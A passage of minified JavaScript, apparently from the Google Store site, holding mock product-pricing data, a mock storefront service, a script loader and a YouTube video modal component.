$49.99.",priceInformation:{was_price:"",was_price_micros:0,current_price:"CA$329",current_price_micros:329e6,currency_code:"CAD",is_discounted:!1,discount_amount:"",is_free:!1,is_same_price:!1,is_eligible_for_epp_pixel_financing:!1,was_epp_per_month_price:"",epp_per_month_price:""},bento:{base:"From CA$329",strikethrough:"",savings:"",eppFinancing:"",eppFinancingWithBase:"$20.79 with 0% APR financing for 24 monthsor from $499"},save:"",orMonthlyRateMessage:""}))),'[[{"docid":"_google_home_mini_chalk","quantity":1},{"docid":"_nest_learning_thermostat_3rd_gen","quantity":1}],""]':new Promise((t=>t({html:'<span class="jZS2Hf" data-test-is-price="">From CA$329</span>',financingHtml:"",ariaLabel:"Starting from $49.99.",priceInformation:{was_price:"",was_price_micros:0,current_price:"CA$329",current_price_micros:329e6,currency_code:"CAD",is_discounted:!1,discount_amount:"",is_free:!1,is_same_price:!1,is_eligible_for_epp_pixel_financing:!1,was_epp_per_month_price:"",epp_per_month_price:""},bento:{base:"From CA$329",strikethrough:"",savings:"",eppFinancing:"",eppFinancingWithBase:"$20.79 with 0% APR financing for 24 monthsor from $499"},save:"",orMonthlyRateMessage:""}))),'[[{"docid":"_google_nest_hub_max_chalk","quantity":1},{"docid":"chromecast_google_tv","quantity":1}],"+"]':new Promise((t=>t({html:'<span class="BFggEc" data-test-discount-amount="">Save $60<sup>+</sup></span><span class="jZS2Hf" data-test-is-price="">From $169</span> <span class="h0uEUb" data-test-was-price="">$229</span>',financingHtml:'<div class="fAkyUe"><div class="DYUuAf"><span><span class="BFggEc">Save $60<sup>+</sup> </span>Pay $169 or $28.17/month</span></div><div class="obluzb"><span>with <b>6 months</b> special financing. </span></div></div>',ariaLabel:"Starting from $49.99.",priceInformation:{was_price:"$229",was_price_micros:229e6,current_price:"$169",current_price_micros:169e6,currency_code:"USD",is_discounted:!0,discount_amount:"$60",is_free:!1,is_same_price:!1,is_eligible_for_epp_pixel_financing:!1,was_epp_per_month_price:"$38.17",epp_per_month_price:"$28.17",epp_number_of_months:6},bento:{base:"From CA$169",strikethrough:"$229",savings:"Save $60",eppFinancing:"Or $15.00 with 0% APR financing for 12 months.",eppFinancingWithBase:"$20.79 with 0% APR financing for 24 monthsor from $499"},save:"Save $60",orMonthlyRateMessage:"or $28.17/month"}))),'[[{"docid":"_google_nest_hub_max_chalk","quantity":1},{"docid":"chromecast_google_tv","quantity":1}],""]':new Promise((t=>t({html:'<span class="BFggEc" data-test-discount-amount="">Save $60</span><span class="jZS2Hf" data-test-is-price="">From $169</span> <span class="h0uEUb" data-test-was-price="">$229</span>',financingHtml:'<div class="fAkyUe"><div class="DYUuAf"><span><span class="BFggEc">Save $60 </span>Pay $169 or $28.17/month</span></div><div class="obluzb"><span>with <b>6 months</b> special financing. </span></div></div>',ariaLabel:"Starting from $49.99.",priceInformation:{was_price:"$229",was_price_micros:229e6,current_price:"$169",current_price_micros:169e6,currency_code:"USD",is_discounted:!0,discount_amount:"$60",is_free:!1,is_same_price:!1,is_eligible_for_epp_pixel_financing:!1,was_epp_per_month_price:"$38.17",epp_per_month_price:"$28.17",epp_number_of_months:6},bento:{base:"From CA$169",strikethrough:"$229",savings:"Save $60",eppFinancing:"Or $15.00 with 0% APR financing for 12 months.",eppFinancingWithBase:"$20.79 with 0% APR financing for 24 monthsor from $499"},save:"Save $60",orMonthlyRateMessage:"or $28.17/month"}))),'[[{"docid":"_sample_nosku","quantity":1}],""]':new Promise((t=>t({html:'<span class="" data-test-is-price="">$299</span>',financingHtml:"",ariaLabel:"Starting from $49.99.",priceInformation:{was_price:"",was_price_micros:229e6,current_price:"$169",current_price_micros:169e6,currency_code:"USD",is_discounted:!0,discount_amount:"",is_free:!1,is_same_price:!1,is_eligible_for_epp_pixel_financing:!1,was_epp_per_month_price:"",epp_per_month_price:"",epp_number_of_months:6},bento:{base:"From CA$169",strikethrough:"",savings:"",eppFinancing:"",eppFinancingWithBase:"$20.79 with 0% APR financing for 24 monthsor from $499"},save:"",orMonthlyRateMessage:""}))),'[[{"docid":"_sample","quantity":1}],""]':new Promise((t=>t({html:'<span class="" data-test-is-price="">$299</span>',financingHtml:"",ariaLabel:"Starting from $49.99.",priceInformation:{was_price:"",was_price_micros:229e6,current_price:"$169",current_price_micros:169e6,currency_code:"USD",is_discounted:!0,discount_amount:"",is_free:!1,is_same_price:!1,is_eligible_for_epp_pixel_financing:!1,was_epp_per_month_price:"",epp_per_month_price:"",epp_number_of_months:6},bento:{base:"From $169",strikethrough:"",savings:"",eppFinancing:"",eppFinancingWithBase:"$20.79 with 0% APR financing for 24 monthsor from $499"},save:"",orMonthlyRateMessage:""}))),'[[{"docid":"_sample","quantity":1,"addons":["_nest_indoor_camera_installation"]}],""]':new Promise((t=>t({html:'<span class="" data-test-is-price="">$199</span>',financingHtml:"",ariaLabel:"Starting from $199.99.",priceInformation:{was_price:"",was_price_micros:229e6,current_price:"$199",current_price_micros:199e6,currency_code:"USD",is_discounted:!0,discount_amount:"",is_free:!1,is_same_price:!1,is_eligible_for_epp_pixel_financing:!1,was_epp_per_month_price:"",epp_per_month_price:"",epp_number_of_months:6},bento:{base:"From $199",strikethrough:"",savings:"",eppFinancing:"",eppFinancingWithBase:"$20.79 with 0% APR financing for 24 monthsor from $499"},save:"",orMonthlyRateMessage:""}))),'[[{"docid":"_sample-with-strike-and-save","quantity":1}],""]':new Promise((t=>t({html:'<span class="BFggEc" data-test-discount-amount="">Save $60<sup>+</sup></span><span class="jZS2Hf" data-test-is-price="">From $169</span> <span class="h0uEUb" data-test-was-price="">$229</span>',financingHtml:"",ariaLabel:"Starting from $49.99.",priceInformation:{was_price:"$229",was_price_micros:229e6,current_price:"$169",current_price_micros:169e6,currency_code:"USD",is_discounted:!0,discount_amount:"$60",is_free:!1,is_same_price:!1,is_eligible_for_epp_pixel_financing:!1,was_epp_per_month_price:"$38.17",epp_per_month_price:"$28.17",epp_number_of_months:6},bento:{base:"From CA$169",strikethrough:"$229",savings:"Save $60",eppFinancing:"Or $28.17 with 0% APR financing for 6 months.",eppFinancingWithBase:"$20.79 with 0% APR financing for 24 monthsor from $499"},save:"Save&nbsp;$60",orMonthlyRateMessage:""}))),'[[{"docid":"_google_home_mini_chalk","quantity":1},{"docid":"_nest_learning_thermostat_3rd_gen","quantity":1}],null]':new Promise((t=>t({html:'<span class="" data-test-is-price="">From CA$329</span>',financingHtml:"",ariaLabel:"Starting from $49.99.",priceInformation:{was_price:"",was_price_micros:0,current_price:"CA$329",current_price_micros:329e6,currency_code:"CAD",is_discounted:!1,discount_amount:"",is_free:!1,is_same_price:!1,is_eligible_for_epp_pixel_financing:!1,was_epp_per_month_price:"",epp_per_month_price:""},save:"",orMonthlyRateMessage:"",bento:{base:"From CA$329",strikethrough:"",savings:"",eppFinancing:"",eppFinancingWithBase:"$20.79 with 0% APR financing for 24 monthsor from $499"}}))),'[[{"docid":"_3m_privacy_filter_pixelbook_go","quantity":1}],""]':new Promise((t=>t({isSamePrice:!1,html:'<span class="" data-test-is-price="">From $38.99</span>',financingHtml:"",ariaLabel:"Starting from $49.99.",priceInformation:{currency_code:"USD",current_price:"$38.99",current_price_micros:3899e4,discount_amount:"",epp_number_of_months:void 0,epp_per_month_price:"",is_discounted:!1,is_eligible_for_epp_pixel_financing:!1,is_eligible_for_epp_pixelbook_financing:!1,is_free:!1,is_same_price:!1,was_epp_per_month_price:"",was_price:"",was_price_micros:0},save:"",orMonthlyRateMessage:"",bento:{base:"From $38.99",strikethrough:"",savings:"",eppFinancing:"",eppFinancingWithBase:"$20.79 with 0% APR financing for 24 monthsor from $499"}}))),'[[{"docid":"_doorbell_wired_2nd_gen_ash","quantity":1}],""]':new Promise((t=>t({isSamePrice:!1,html:'<span class="" data-test-is-price="">From $179.99</span>',financingHtml:'<div class="fAkyUe"><div class="DYUuAf"><span><span>Pay</span> $179.99 or $15.00/month</span></div><div class="obluzb"><span>with <b>12 months</b> special financing</span>. </div></div>',ariaLabel:"Starting from $49.99.",priceInformation:{currency_code:"USD",current_price:"$179.99",current_price_micros:17999e4,discount_amount:"",epp_number_of_months:12,epp_per_month_price:"$15.00",is_discounted:!1,is_eligible_for_epp_pixel_financing:!1,is_eligible_for_epp_pixelbook_financing:!1,is_free:!1,is_same_price:!1,was_epp_per_month_price:"",was_price:"",was_price_micros:0},save:"",orMonthlyRateMessage:"or $15.00/month",bento:{base:"From $179.99",strikethrough:"",savings:"",eppFinancing:"Or $15.00 with 0% APR financing for 12 months.",eppFinancingWithBase:"$20.79 with 0% APR financing for 24 monthsor from $499"}}))),'[[{"docid":"_google_nest_hub_max_chalk","quantity":1}],""]':new Promise((t=>t({isSamePrice:!1,html:'<span class="" data-test-discount-amount="">Save $55</span><span class="" data-test-is-price="">From $174</span> <span class="ss9vM" data-test-was-price="">$229</span>',financingHtml:'<div class="fAkyUe"><div class="DYUuAf"><span><span class="BFggEc">Save $55<sup>Δ</sup> </span><span>Pay</span> $174 or $14.50/month</span></div><div class="obluzb"><span>with <b>12 months</b> special financing</span>. </div></div>',ariaLabel:"Starting from $49.99.",priceInformation:{currency_code:"USD",current_price:"$174",current_price_micros:174e6,discount_amount:"$55",epp_number_of_months:12,epp_per_month_price:"$14.50",is_discounted:!0,is_eligible_for_epp_pixel_financing:!1,is_eligible_for_epp_pixelbook_financing:!1,is_free:!1,is_same_price:!1,was_epp_per_month_price:"$19.08",was_price:"$229",was_price_micros:229e6},save:"Save $55",orMonthlyRateMessage:"or $14.50/month",bento:{base:"From $174",strikethrough:"$229",savings:"Save $55",eppFinancing:"Or $14.50 with 0% APR financing for 12 months.",eppFinancingWithBase:"$20.79 with 0% APR financing for 24 monthsor from $499"}}))),'[[{"docid":"_google_nest_wifi_point_mist","quantity":1}],""]':new Promise((t=>t({isSamePrice:!1,html:'<span class="" data-test-discount-amount="">Save $50</span><span class="" data-test-is-price="">From $99</span> <span class="ss9vM" data-test-was-price="">$149</span>',financingHtml:"",ariaLabel:"Starting from $49.99.",priceInformation:{currency_code:"USD",current_price:"$99",current_price_micros:99e6,discount_amount:"$50",epp_number_of_months:void 0,epp_per_month_price:"",is_discounted:!0,is_eligible_for_epp_pixel_financing:!1,is_eligible_for_epp_pixelbook_financing:!1,is_free:!1,is_same_price:!1,was_epp_per_month_price:"",was_price:"$149",was_price_micros:149e6},save:"Save $50",orMonthlyRateMessage:"",bento:{base:"From $99",strikethrough:"$149",savings:"Save $50",eppFinancing:"",eppFinancingWithBase:"$20.79 with 0% APR financing for 24 monthsor from $499"}})))}})),$_=Ge((()=>{}));function L_(t,e){return Math.floor(Math.random()*(e-t+1))+t}var D_=Ge((()=>{$_()})),k_,F_=Ge((()=>{k_={'[["pixel_6a"],null]':new Promise((t=>t(new Map([["pixel_6a",{isSamePrice:!1,html:'<span class="" data-test-discount-amount="">Save $100</span><span class="" data-test-is-price="">From $349</span> <span class="ss9vM" data-test-was-price="">$449</span>',financingHtml:'<div class="fAkyUe"><div class="DYUuAf"><span><span class="BFggEc">Save $100<sup>Δ</sup> </span><span>Pay</span> $349 or $14.54/month</span></div><div class="obluzb"><span>with <b>24 months</b> financing</span>.<span class="footnote-pointer">*</span> </div></div>',ariaLabel:"Starting from $49.99.",priceInformation:{currency_code:"USD",current_price:"$349",current_price_micros:349e6,discount_amount:"$100",epp_number_of_months:24,epp_per_month_price:"$14.54",is_discounted:!0,is_eligible_for_epp_pixel_financing:!1,is_eligible_for_epp_pixelbook_financing:!1,is_free:!1,is_same_price:!1,was_epp_per_month_price:"$18.71",was_price:"$449",was_price_micros:449e6},save:"Save $100",orMonthlyRateMessage:"or $14.54/month",bento:{base:"From $349",strikethrough:"$449",savings:"Save $100",eppFinancing:"Or $14.54 with 0% APR financing for 24 months."}}]])))),'[["pixel_7"],null]':new Promise((t=>t({isSamePrice:!1,html:'<span class="" data-test-is-price="">From $599</span>',financingHtml:'<div class="fAkyUe"><div class="DYUuAf"><span><span>Pay</span> $599 or $24.96/month</span></div><div class="obluzb"><span>with <b>24 months</b> financing</span>.<span class="footnote-pointer">*</span> </div></div>',ariaLabel:"Starting from $49.99.",priceInformation:{currency_code:"USD",current_price:"$599",current_price_micros:599e6,discount_amount:"",epp_number_of_months:24,epp_per_month_price:"$24.96",is_discounted:!1,is_eligible_for_epp_pixel_financing:!1,is_eligible_for_epp_pixelbook_financing:!1,is_free:!1,is_same_price:!1,was_epp_per_month_price:"",was_price:"",was_price_micros:0},save:"",orMonthlyRateMessage:"or $24.96/month",bento:{base:"From $599",strikethrough:"",savings:"",eppFinancing:"Or $24.96 with 0% APR financing for 24 months."}}))),'[["pixel_buds_a_series"],null]':new Promise((t=>t({isSamePrice:!1,html:'<span class="" data-test-discount-amount="">Save $30</span><span class="" data-test-is-price="">From $69</span> <span class="ss9vM" data-test-was-price="">$99</span>',financingHtml:"",ariaLabel:"Starting from $49.99.",priceInformation:{currency_code:"USD",current_price:"$69",current_price_micros:69e6,discount_amount:"$30",epp_number_of_months:void 0,epp_per_month_price:"",is_discounted:!0,is_eligible_for_epp_pixel_financing:!1,is_eligible_for_epp_pixelbook_financing:!1,is_free:!1,is_same_price:!1,was_epp_per_month_price:"",was_price:"$99",was_price_micros:99e6},save:"Save $30",orMonthlyRateMessage:"",bento:{base:"From $69",strikethrough:"$99",savings:"Save $30",eppFinancing:""}}))),'[["nest_audio"],null]':new Promise((t=>t({isSamePrice:!0,html:'<span class="" data-test-is-price="">$99.99</span>',financingHtml:"",ariaLabel:"Starting from $49.99.",priceInformation:{currency_code:"USD",current_price:"$99.99",current_price_micros:9999e4,discount_amount:"",epp_number_of_months:void 0,epp_per_month_price:"",is_discounted:!1,is_eligible_for_epp_pixel_financing:!1,is_eligible_for_epp_pixelbook_financing:!1,is_free:!1,is_same_price:!0,was_epp_per_month_price:"",was_price:"",was_price_micros:0},save:"",orMonthlyRateMessage:"",bento:{base:"$99.99",strikethrough:"",savings:"",eppFinancing:""}}))),'[["test"],null]':new Promise((t=>t({isSamePrice:!1,html:'<span class="" data-test-is-price="">From $599</span>',financingHtml:'<div class="fAkyUe"><div class="DYUuAf"><span><span>Pay</span> $599 or $24.96/month</span></div><div class="obluzb"><span>with <b>24 months</b> financing</span>.<span class="footnote-pointer">*</span> </div></div>',ariaLabel:"Starting from $49.99.",priceInformation:{currency_code:"USD",current_price:"$599",current_price_micros:599e6,discount_amount:"",epp_number_of_months:24,epp_per_month_price:"$24.96",is_discounted:!1,is_eligible_for_epp_pixel_financing:!1,is_eligible_for_epp_pixelbook_financing:!1,is_free:!1,is_same_price:!1,was_epp_per_month_price:"",was_price:"",was_price_micros:0},save:"",orMonthlyRateMessage:"or $24.96/month",bento:{base:"From $599",strikethrough:"",savings:"",eppFinancing:"Or $24.96 with 0% APR financing for 24 months."}}))),'[["test_disabled"],null]':new Promise((t=>t({isSamePrice:!1,html:'<span class="" data-test-discount-amount="">Save $30</span><span class="" data-test-is-price="">From $69</span> <span class="ss9vM" data-test-was-price="">$99</span>',financingHtml:"",ariaLabel:"Starting from $49.99.",priceInformation:{currency_code:"USD",current_price:"$69",current_price_micros:69e6,discount_amount:"$30",epp_number_of_months:void 0,epp_per_month_price:"",is_discounted:!0,is_eligible_for_epp_pixel_financing:!1,is_eligible_for_epp_pixelbook_financing:!1,is_free:!1,is_same_price:!1,was_epp_per_month_price:"",was_price:"$99",was_price_micros:99e6},save:"Save $30",orMonthlyRateMessage:"",bento:{base:"From $69",strikethrough:"$99",savings:"Save $30",eppFinancing:""}})))}})),Xf,N_=Ge((()=>{Xf={pixel_7:{message:"From $24.96/month",monthlyRate:"$24.96",numberOfMonths:24},pixel_7_pro:{message:"From $24.97/month",monthlyRate:"$24.97",numberOfMonths:36}}})),Qf,_s,_c,V_=Ge((()=>{bs(),I_(),O_(),M_(),D_(),F_(),N_(),Qf={},(_c=_s=class{constructor(){this._subscribeUserSucceeds=!0,this.productCtaDataMap=new Map,document.addEventListener("populatePrices",(()=>{document.querySelectorAll(".is-was-price-text").forEach((t=>{t.innerHTML="\n          <span>\n            <span data-test-is-price>$25</span>\n            <span data-test-was-price>$30</span>\n          </span>\n        "}))}))}fetchPostalCodeRebate(t){return new Promise((e=>e("94114"===t?"Rebate":"")))}launchTradeInFlowDialog({pageDocid:t,promotionalProductDocid:e}={}){return new Promise((t=>t({encryptedTradeInId:"xxx",deviceLabel:"Test, Apple, iPhone XS, 512 GB",formattedTradeInValue:"$165",tradeInValue:"USD,165"})))}removeTradeInDetailsFromUrl(){}fetchPixelPassSubscriptionPrice(t){if(Xf[t])return Promise.resolve(Xf[t]);throw new Error(`No mock Pixel Pass Subscript Price Data found for ${t}`)}fetchSubscriptionTypes(){return new Promise((t=>t([])))}static getMockProductCtaData(t){if(Yf[t])return Yf[t];throw new Error(`No mock Product Cta Data found for ${t}`)}static getMockResponse(t,e){let i=this.fnNameToMockResponse[t],r=JSON.stringify(e);if(!i[r]){let i=e.map((t=>JSON.stringify(t))).join(", ");if(!Qf.env.TEST)throw new Error(`No mock response is found for the call to mannequinService.${t}. Please run mannequinService.${t}(${i}).then((result) => console.log(JSON.stringify(result)));\nCopy the resulting string and put it in the appropriate mock response record for ${t} under the key: ${r}`)}return i[r]}isSubscribedToMarketingEmails(){let t=new URLSearchParams(window.location.search).has("subscribed");return new Promise((e=>e(t)))}getBundlePrice(t,e){return _s.getMockResponse("getBundlePrice",[t,e])}getPriceByPageDocid(t,e){return new Promise((i=>i(_s.getMockResponse("getPriceByPageDocid",[t,e]))))}setInnerHtml(t,e){Qf.env.TEST||console.warn("MockMannequinService does not properly implement setInnerHtml"),t.innerHTML=e}subscribeUser(){return new Promise(((t,e)=>{this._subscribeUserSucceeds?t():e()}))}redirectToLogin(){throw new Error("redirectToLogin not implemented in MannequinService mock")}async safeLoad(){throw new Error("safeLoad not implemented in MannequinService mock")}navigateToUrl(t){console.log(`Called mockMannequinService.navigateToUrl with ${t}`)}joinWaitlist(){return new Promise((t=>{t({updatedBehavior:Ca.LEAVE_WAITLIST,updatedLabel:"Leave Waitlist"})}))}leaveWaitlist(){return new Promise((t=>{t({updatedBehavior:Ca.JOIN_WAITLIST,updatedLabel:"Join Waitlist"})}))}addToCart(t,e){return e?.respectRedirect?(console.log("added to cart with respectRedirect"),_s.getMockResponse("addToCart",[t])):_s.getMockResponse("addToCart",[t])}fetchEnergyRebates(t){return new Promise((t=>t([{heading:"Get up to a $120 back on any Nest thermostat",copy:"<p>You can get a $50 rebate on a Nest Thermostat if you purchase, install, and connect it in your home. You can get one thermostat per household. You'll need to be a current PG&E residential customer and have home Wi-Fi. For a limited time, you can get an additional $70 bonus when you enroll in a Time of Use rate.  </p>",cta_label:"Learn more",cta_url:"https://www.pge.com/smartthermostat",logo_url:"https://s3.amazonaws.com/marketing-assets.nest.com/offers/offer/image_2x/211/incentive_avatar-19e29ddaa28ef548d9b40edf5a956704276c8091.png",type:3,rebate_amount:120,rebate_amount_formatted:"$120",currency_code:"USD"}])))}fetchProductCtaData(t){return t.forEach((t=>{this.productCtaDataMap.set(t,_s.getMockProductCtaData(t))})),new Promise((t=>{if(Qf.env.TEST)t(new Map(this.productCtaDataMap));else{let e=L_(500,3e3);window.setTimeout((()=>{t(new Map(this.productCtaDataMap))}),e)}}))}showConfigOverlay(t){console.log(`Showing Newton: ${t}`)}logEvent(t){return new Promise((e=>{window.dataLayer.push(t),e()}))}}).fnNameToMockResponse={addToCart:P_,getBundlePrice:R_,getPriceByPageDocid:k_}})),q_,bc,Ca,wc,_n,bs=Ge((()=>{var t,e;cc(),V_(),q_="undefined"!=typeof process&&process.env.USE_MOCK_MANNEQUIN_SERVICE?_c:void 0,(t=bc||(bc={})).UNKNOWN="UNKNOWN",t.NEST_AWARE="NEST_AWARE",t.CONCIERGE="CONCIERGE",t.PLATFORM="PLATFORM",t.BUNDLE="BUNDLE",(e=Ca||(Ca={})).UNSPECIFIED="UNSPECIFIED",e.REDIRECT="REDIRECT",e.JOIN_WAITLIST="JOIN_WAITLIST",e.SIGN_IN_AND_JOIN_WAITLIST="SIGN_IN_AND_JOIN_WAITLIST",e.LEAVE_WAITLIST="LEAVE_WAITLIST",e.ADD_TO_CART="ADD_TO_CART",e.DISABLED="DISABLED",_n=wc=()=>(window.MQN3_GLOBAL_MANNEQUIN_SERVICE_PROMISE||(window.MQN3_GLOBAL_MANNEQUIN_SERVICE_PROMISE=new Promise((t=>{window.mannequinService?t(window.mannequinService):ma?document.addEventListener("mannequinServiceReady",(()=>{window.mannequinService=window.mannequinService,t(window.mannequinService)}),{once:!0}):q_?(console.log("Using Mock Mannequin Service"),window.mannequinService=new q_,t(window.mannequinService)):t(void 0)}))),window.MQN3_GLOBAL_MANNEQUIN_SERVICE_PROMISE)})),Kf,B_=Ge((()=>{Kf=class{constructor(){this.loadedScripts={},this.disposed=!1}load(t,e){let i=this.loadedScripts[t];if(i)return i;let r=new Promise(((i,r)=>{if(e.test())return void i();this.renderScriptTag(t,e);let n=Date.now(),s=e.timeout||5e3,o=()=>{this.disposed?r("script loader is disposed"):e.test()?i():Date.now()-n>s?r(`failed to load ${t} due to timeout`):window.requestAnimationFrame(o)};window.requestAnimationFrame(o)}));return this.loadedScripts[t]=r,r.catch((e=>{console.error(`failed to load ${t}`),console.error(e),delete this.loadedScripts[t]})),r}renderScriptTag(t,e){let i=document.createElement("script");if(e?.attrs)for(let t in e.attrs){let r=e.attrs[t];i.setAttribute(t,r)}i.src=t,document.body.appendChild(i)}renderDom(t){this.renderScriptTag(t)}dispose(){this.loadedScripts={},this.disposed=!0}}}));function e$(){return!location.hostname.endsWith(".google.com")||location.pathname.includes("/intl/")||location.pathname.includes("/ideas/")}var Ta,Zf=Ge((()=>{bs(),B_(),Ta=class extends Kf{renderScriptTag(t,e){e$()?super.renderScriptTag(t,e):_n().then((i=>{i.safeLoad?i.safeLoad(t,e?.attrs):super.renderScriptTag(t)}))}}}));function W_(...t){}var U_=Ge((()=>{})),Jf,H_=Ge((()=>{U_(),Jf=class extends Map{static usingFunction(t){return new this([],t)}constructor(t=[],e=W_){super(t),this.defaultFunction=e}get(t){if(this.has(t))return super.get(t);{let e=this.defaultFunction(t);return this.set(t,e),e}}}})),ed,G_=Ge((()=>{H_(),ed=class{constructor(){this.callbacks=Jf.usingFunction((()=>new Set))}on(t,e){this.callbacks.get(t).add(e)}dispatch(t,...e){this.callbacks.get(t).forEach((t=>t(...e)))}off(t,e){let i=this.callbacks.get(t);i.delete(e),0===i.size&&this.callbacks.delete(t)}dispose(){let t=this.callbacks.values(),e=t.next();for(;!e.done;)e.value.clear(),e=t.next();this.callbacks.clear()}}})),Ec,td=Ge((()=>{G_(),Ec=t=>class extends t{connectedCallback(){super.connectedCallback(),this.eventManager=new ed}on(t,e){this.eventManager.on(t,e)}off(t,e){this.eventManager.off(t,e)}dispatch(t,e){let i=new CustomEvent(t,{detail:e});this.dispatchEvent(i),this.eventManager?.dispatch(t,e)}disconnectedCallback(){super.disconnectedCallback(),this.eventManager?.dispose()}}})),z_,j_=Ge((()=>{Sa(),z_=t=>t??fr})),Y_=Ge((()=>{j_()})),rd,t$,bn,X_=Ge((()=>{Aa(),ys(),jf(),Zf(),td(),Y_(),xf(),(rd||(rd={})).STATE_CHANGE="stateChange",t$="https://www.youtube.com/iframe_api?trustedtypes=1",(bn=class extends(Ec(ei)){constructor(){super(...arguments),this.enableJsApi=!1,this.autoplay=!1,this.scriptLoader=new Ta,this.youtubeReadyDefer=new pa}firstUpdated(){this.autoplay&&this.loadAndPlay(this.videoId,this.autoplay)}pause(){this.player?.pauseVideo?.()}get playerState(){return this.player?.getPlayerState()}play(){this?.player?.playVideo()}async focusWhenReady(){await this.youtubeReadyDefer.getPromise(),this.player.getIframe().focus()}async loadAndPlay(t,e=!1){if(t&&(this.videoId=t),this.player&&e)return void this.player.loadVideoById(this.videoId);this.player?.destroy(),await this.scriptLoader.load(t$+`&origin=${location.href}`,{test:()=>!!window.YT&&1===window.YT.loaded});let i={autohide:1,autoplay:this.autoplay?1:0,fs:1,modestbranding:1,rel:0,showinfo:0,iv_load_policy:3,enablejsapi:this.enableJsApi?1:0,origin:location.href},r=Object.assign({},i),n={videoId:this.videoId,playerVars:r,events:{onReady:t=>{e&&(this.player=t.target,this.play(),this.youtubeReadyDefer.resolve())},onStateChange:t=>{let e=new CustomEvent(rd.STATE_CHANGE,{detail:{event:t},bubbles:!0,composed:!0});this.dispatchEvent(e)}}};this.player=new YT.Player(this.playerElement,n)}render(){return Vn` <bento-box
      radius=${z_(void 0!==this.radius?"28; tabletLt:20":void 0)}
      grow
    >
      <div class="container">
        <div class="container__player"></div></div
    ></bento-box>`}disconnectedCallback(){super.disconnectedCallback(),this.scriptLoader.dispose()}}).styles=ya`
    :host {
      aspect-ratio: var(--bento-youtube-inline-aspect-ratio, 16 / 9);
      width: 100%;
      display: inline-block;
    }
    .container {
      align-items: center;
      cursor: pointer;
      display: inline-flex;
      justify-content: center;
      position: relative;
      width: 100%;
      height: 100%;
    }
    .container__player {
      bottom: 0;
      height: 100%;
      left: 0;
      position: absolute;
      right: 0;
      top: 0;
      width: 100%;
      z-index: 1;
    }
  `,zt([Ur({type:String,attribute:"video-id",reflect:!0})],bn.prototype,"videoId",2),zt([Ur({type:Boolean,attribute:"enable-js-api",reflect:!0})],bn.prototype,"enableJsApi",2),zt([Ur({type:Boolean,attribute:"autoplay",reflect:!0})],bn.prototype,"autoplay",2),zt([qn(".container__player")],bn.prototype,"playerElement",2),zt([Ur({type:String})],bn.prototype,"radius",2),bn=zt([yc("bento-youtube-inline")],bn)})),Q_,K_=Ge((()=>{vn(),Q_=t=>class extends t{connectedCallback(){super.connectedCallback(),this.watcher=new Ar}disconnectedCallback(){super.disconnectedCallback(),this.watcher&&this.watcher.dispose()}}})),id,Zi,Z_=Ge((()=>{va(),Aa(),ws(),X_(),ys(),K_(),vn(),Sc(),(id||(id={})).OPEN="openmqn3youtubemodal",(Zi=class extends(Q_(ei)){constructor(){super(...arguments),this.isOpen=!1,this.clickDelegateDisposer=null,this.openEventDelegateDisposer=null,this.closeButtonAriaLabel="Close",this.youtubeIframeFocus=!1}init(t){this.frame=t,!this.frame.closest("bento-app:not(:scope)")&&(this.watcher||(this.watcher=new Ar),this.watcher.add({element:this.frame,on:dr.Event.FIRST_DOM_AVAILABLE,callback:this.listen.bind(this)}),this.watcher.add({element:this.frame,on:dr.Event.MUTATION,callback:this.listen.bind(this)}))}listen(){this.clickDelegateDisposer&&this.clickDelegateDisposer(),this.clickDelegateDisposer=ga(this.frame,"click",(t=>{if(t.isMqn3YoutubeModalTrigger)return;let e=t.getAttribute("youtube-modal");e&&this.openModalAndPlay(e)})),this.openEventDelegateDisposer&&this.openEventDelegateDisposer(),this.openEventDelegateDisposer=ga(this.frame,id.OPEN,((t,e)=>{e.detail?.youtubeId&&this.openModalAndPlay(e.detail?.youtubeId)}))}openModalAndPlay(t){this.isConnected||document.body.appendChild(this),window.setTimeout((()=>{this.youtubeId=t,window.setTimeout((()=>{this.watcher.removeById("toggle"),this.watcher.add({element:this.details,on:"toggle",id:"toggle",callback:this.onToggle.bind(this)}),this.detailsDialog.toggle(!0)}))}))}onToggle(){this.isOpen=this.details.open,this.isOpen&&this.youtubeInline?(this.youtubeInline.loadAndPlay(this.youtubeId,!0),this.watcher.add({element:this.youtubeInline,on:"focus",id:"youtubeFocus",callback:t=>{this.youtubeInline.focusWhenReady(),this.youtubeIframeFocus=!0}}),this.watcher.add({element:this.youtubeInline,on:"blur",id:"youtubeBlur",callback:t=>{this.youtubeIframeFocus=!1}}),this.closeButton.focus()):(this.watcher.removeById("keywatch"),this.watcher.removeById("youtubeBlur"),this.youtubeInline.pause())}toggle(t){this.detailsDialog.toggle(t)}render(){return Vn`
      <details class="modal">
        <summary></summary>
        <details-dialog aria-label="" role="dialog" aria-modal="true">
          <button
            style="border: none; background: none;"
            @focus=${()=>{this.youtubeInline.focusWhenReady(),this.youtubeIframeFocus=!0}}
          ></button>
          <button
            class="modal__close"
            data-close-dialog=""
            aria-label="${this.closeButtonAriaLabel}"
          ></button>
          <div class="modal__content">
            <bento-youtube-inline tabindex="0"></bento-youtube-inline>
          </div>
          <button
            style="border: none; background: none;"
            @focus=${()=>{this.closeButton.focus()}}
          ></button>
        </details-dialog>
      </details>
    `}disconnectedCallback(){super.disconnectedCallback(),this.watcher&&this.watcher.dispose(),this.clickDelegateDisposer&&this.clickDelegateDisposer(),this.openEventDelegateDisposer&&this.openEventDelegateDisposer()}dispose(){this.remove()}}).styles=ya`
    :host {
      height: 100vh;
      width: 100vw;
      top: 0px;
      position: fixed;
      z-index: 99999;
      pointer-events: none;
    }

    .modal summary {
      display: none;
    }

    .modal[open] > summary {
      display: block;
      cursor: default;
    }

    details-dialog {
      position: fixed;
      top: 0;
      left: 0%;
      transform: 0;
      z-index: 2001;
      max-height: 100vh;
      max-width: 100vw;
      width: 100vw;
      height: 100vh;
      overflow: auto;
      pointer-events: all;
      background-color: #202124;
    }

    .modal__content {
      width: calc(100vw - 22.1912072575vw);
      height: calc(100vh - 7.3970690858vw);
      max-height: calc((100vw - 22.1912072575vw) * 9 / 16);
      max-width: calc((100vh - 7.3970690858vw) * 16 / 9);
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translateY(-50%) translateX(-50%);
      z-index: 2;
    }

    .modal__close {
      overflow: visible !important;
      background-color: transparent !important;
      border-radius: 100%;
      border: 2px solid rgba(95, 99, 104, 0.6);
      top: 35px !important;
      right: 50px !important;
      position: absolute;
      top: 0px;
      width: 60px;
      height: 60px;
      z-index: 1;
    }

    @media (max-width: 1024px) {
      .mqn3-modal__close {
        width: 46px;
        height: 46px;
      }
    }

    @media (max-width: 600px) {
      .mqn3-modal__close {
